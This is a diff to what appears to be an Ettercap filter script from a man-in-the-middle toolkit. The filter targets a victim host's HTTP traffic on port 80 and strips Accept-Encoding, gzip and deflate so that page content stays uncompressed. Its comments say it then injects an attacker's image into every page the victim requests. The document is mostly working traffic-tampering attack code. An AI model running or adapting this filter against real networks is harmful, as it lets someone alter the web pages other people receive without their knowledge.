@@ -10,9 +10,11 @@
 #                                                                          #
 ############################################################################
 
+
 ##
 #  This filter will substitute the html tag '<img src=>'
 #  and injects your image in any webpage requested by TaRONE
+#  Warning: This filter only modifies http traffic..
 ##
 
 
@@ -22,19 +24,35 @@
 ## Zap Content Encoding ##
 ##########################
 # change target request to server
-if (ip.proto == TCP && tcp.dst == 80) {  
-  if (search(DATA.data, "Accept-Encoding")) {  
-    replace("Accept-Encoding", "Accept-Rubbish!");   
-      # note: replacement string is same length as original string
-      msg("[morpheus] host:TaRONE   [ ⊶ ]");
-      msg("[Morpheus] | Status: Encoding zapped from response ✔");  
-   }  
-   if (search(DATA.data, "gzip")) {  
-    replace("gzip", "  ");  
+if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[morpheus] host:TaRONE   [ ⊶ ]");
+    if (search(DATA.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | Status: Encoding zapped from response ✔");
+    }else{
+    if (search(DECODED.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!"); # note: replacement string is same length as original string
+      msg("[Morpheus] | Status: Encoding zapped from response ✔");
+    }
+    }
+}
+
+if (ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "gzip")) {  
+    replace("gzip", "  "); # note: four spaces In the replacement string
     msg("[Morpheus] |  info : gzip zapped from response ✔");
     msg("[Morpheus] |_ info : Image injected and forward to target ✔\n"); 
    }  
 }
+
+if (ip.proto == TCP && tcp.dst == 80) {
+  if (search(DATA.data, "deflate")) {
+    replace("deflate", "       "); # note: seven spaces In the replacement string
+    msg("[Morpheus] |  packet string deflate zapped ✔");
+  }
+}
+
+
 
 
 #####################
